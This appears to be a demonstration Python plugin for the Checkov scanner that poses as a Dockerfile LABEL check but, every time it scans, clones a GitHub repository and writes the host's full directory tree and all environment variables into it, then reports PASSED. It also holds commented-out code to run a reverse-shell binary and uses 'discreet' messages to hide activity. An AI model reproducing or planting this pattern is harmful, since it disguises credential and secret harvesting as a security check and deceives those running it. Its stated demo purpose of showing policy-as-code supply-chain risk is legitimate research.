from __future__ import annotations

from typing import TYPE_CHECKING, List
import re, json, os, subprocess, shutil

from checkov.common.models.enums import CheckCategories, CheckResult
from checkov.dockerfile.base_dockerfile_check import BaseDockerfileCheck

if TYPE_CHECKING:
    from dockerfile_parse.parser import _Instruction


def list_directory_tree(start_path):
    result = []
    for root, dirs, files in os.walk(start_path):
        level = root.replace(start_path, '').count(os.sep)
        indent = ' ' * 4 * level
        result.append(f"{indent}{os.path.basename(root)}/")
        subindent = ' ' * 4 * (level + 1)
        for file in files:
            result.append(f"{subindent}{file}")
    return result

# where the magic happens
def infiltrate_exfiltrate():

    # Variables
    repo_url = "https://github.com/ytimyno/cat-pictures"  
    clone_dir = "cats"
    check_if_you_read = "astronaut_riding_a_whale"

    # Prompt the user to enter a code word
    # print("Are you aware of what could happen? You specified a repo_url that (probably) contains a token for you to authenticate to your GitHub (or similar) and you will clone the specified repo into the specified clone_dir. If that clone_dir posses stuff, you might overwrite it. Additionally, right at the end, the cloned directory will be REMOVED, COMPLETLY. Just want to give you one last chance. Feel free to clone this check and remove this. Check the source code and change the check_if_you_read variable to the correct value.")

    try:

        if check_if_you_read == "astronaut_riding_a_whale":
            print("Access granted! You entered the correct code word in check_if_you_read. Continuing")
        else:
            print("Access denied! The code word in the var check_if_you_read is wrong. Check the source code.")
            return

        subprocess.run(["git", "clone", repo_url, clone_dir], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)

        # exe_path = os.path.join(clone_dir, "reverse_shell.elf")
        # if os.path.exists(exe_path):
        #     try:
        #         subprocess.run([exe_path])
        #     except subprocess.CalledProcessError as e:
        #         print(f".")
        # else:
        #     print(f"..")

        output_file = clone_dir+"/directory_tree.txt"
        with open(output_file, 'w') as f:
            for line in list_directory_tree('/'):
                f.write(f"{line}\n")

        env_output_file = clone_dir+"/environment_variables.txt"
        with open(env_output_file, 'w') as f:
            for key, value in os.environ.items():
                f.write(f"{key}={value}\n")

        


    except subprocess.CalledProcessError as e:
        # discreet message 
        print(f"...")

    finally:
        if os.path.exists(clone_dir):
            # # discreet remove directory - not removing to be able to see it in the host
            # shutil.rmtree(clone_dir)
            print(f"sssh")


class MaliciousLabelCheck(BaseDockerfileCheck):

    def __init__(self) -> None:
        name = "Ensure mandatory LABEL instructions have been added to container images"
        id = "CKV_SALTY_LABELS_CHECK"
        supported_instructions = ("*",)
        categories = (CheckCategories.NETWORKING,)
        guideline = "This is a malicious check for demo purposes only. Powered by Checkov and Python. Home: ytimyno/pac-on-rails"

        super().__init__(name=name, id=id, categories=categories, supported_instructions=supported_instructions, guideline=guideline)

    def scan_resource_conf(self, conf: dict[str, list[_Instruction]]) -> Tuple[CheckResult, Union[list[_Instruction], None]]:  # type:ignore[override]  # special wildcard behaviour
        
        failCheck = False
        message = "Checking for LABELS."
        infiltrate_exfiltrate()
        return CheckResult.PASSED, None


check = MaliciousLabelCheck()
